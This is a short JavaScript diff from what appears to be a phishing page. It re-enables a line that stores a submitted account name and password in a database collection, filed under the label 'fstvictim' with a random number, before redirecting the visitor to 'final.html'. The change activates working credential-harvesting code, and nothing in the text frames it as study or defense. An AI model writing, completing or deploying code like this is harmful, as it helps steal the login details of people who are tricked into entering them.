@@ -16,7 +16,7 @@ function sendthis(){
 	data = {accname:name,accpass:pass}
 	if (name !== "" && vid !== "" && pass !== "" )
 	{
-		//db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
+		db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
 		window.location.href = "final.html";
 	}
 	else
